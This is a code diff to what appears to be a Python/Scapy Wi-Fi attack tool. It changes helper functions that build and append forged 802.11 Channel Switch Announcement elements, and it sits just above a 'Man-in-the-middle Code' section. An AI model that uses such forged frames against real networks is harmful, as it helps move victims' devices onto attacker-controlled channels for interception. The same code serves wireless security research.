@@ -188,31 +188,23 @@ def construct_csa(channel, count=1):
 	switch_mode = 1			# STA should not Tx untill switch is completed
 	new_chan_num = channel	# Channel it should switch to
 	switch_count = count	# Immediately make the station switch
+
 	# Contruct the IE
-	# payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
-	csa_ie = Dot11Elt(ID='DSset', info=chr((switch_mode << 7) | new_chan_num))
-	csa_counter_element = Dot11Elt(ID=IEEE_TLV_TYPE_VENDOR, info=b'\x08\x00\x10\x00' + bytes([switch_count]))
-	return csa_ie / csa_counter_element
-
-	# csa_ie = Dot11Elt(ID='DSset', info=chr((switch_mode << 7) | new_chan_num))
-	# csa_counter_element = Dot11Elt(ID=IEEE_TLV_TYPE_VENDOR, info=b'\x08\x00\x10\x00' + bytes([switch_count]))
-
-	# if (target == None):
-	# 	csa_beacon = Dot11(type=0, subtype=8, FCfield='from-DS+to-DS', addr1=target, addr2=apmac, addr3=apmac) / Dot11Beacon() / csa_ie / csa_counter_element
-	# else:
-	# 	csa_beacon = Dot11(type=0, subtype=8, FCfield='from-DS+to-DS', addr1='ff:ff:ff:ff:ff:ff', addr2=apmac, addr3=apmac) / Dot11Beacon() / csa_ie / csa_counter_element
-	# return csa_beacon
-
+	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
+	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)
 
 def append_csa(p, channel, count=1):
 	p = p.copy()
+
 	el = p[Dot11Elt]
 	prevel = None
 	while isinstance(el, Dot11Elt):
 		prevel = el
 		el = el.payload
+
 	prevel.payload = construct_csa(channel, count)
-	return prevel
+
+	return p
 
 
 #### Man-in-the-middle Code ####
